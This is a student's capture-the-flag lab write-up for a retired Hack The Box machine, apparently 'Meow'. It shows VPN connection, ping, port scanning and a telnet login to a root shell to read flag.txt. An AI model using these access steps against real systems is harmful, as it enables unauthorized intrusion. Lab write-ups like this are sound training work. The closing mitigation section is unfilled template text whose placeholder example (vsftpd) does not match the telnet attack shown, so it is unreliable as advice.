# HACK THE BOX – CAPTURE THE FLAG CHALLENGE

## AIM
To perform structured reconnaissance and authorized exploitation on a retired HTB machine to retrieve flag.txt, and document the entire process.

### Deliverables
- Steps followed (tools used and why)
- Screenshot of captured flag
- Mitigation or patch suggestion

## ALGORITHM

1. **Create a Login Account for Hack the Box (HTB).**
2. **Go to the Tier1 lab practice.**
3. **Connect to the HTB PWNBox.**
4. **Download the OpenVPN file to Connect to OpenVPN**
5. **Get the Targeted IP Address from HTB.**
6. **Ping IP address from Kali Linux terminal.**
7. **Scan the target for open Ports to Attack.**
8. **Use the open Port to get access to the target root system.**
9. **Use the “Telnet” Command with target IP to access the Target System.**
10. **Use the “cat” Command to Read the flag file.**

## COMMANDS

```bash
ping 10.129.132.136
# Sample output:
# 64 bytes from 10.129.132.136: icmp_seq=1 ttl=63 time=429 ms
# ...
sudo openvpn starting_point_<username>.ovpn
cat scan.nmap
# (Nmap scan output)
telnet 10.129.132.136
# (Login to target, get shell)
root@Meow :~ # ls
root@Meow :~ # cat flag.txt
# b40abdfe23665f766f9c61ecba8a4c19 (example flag)
```

## SUGGESTIONS

- The exploit utilized a vulnerability in [specify the software, e.g., 'vsftpd 2.3.4'].
- The immediate mitigation is to patch/upgrade this software to the latest stable version [specify version number, e.g., '3.0.3'].
- Alternatively, disable the vulnerable service if it's not essential, and enforce the principle of least privilege for all service accounts.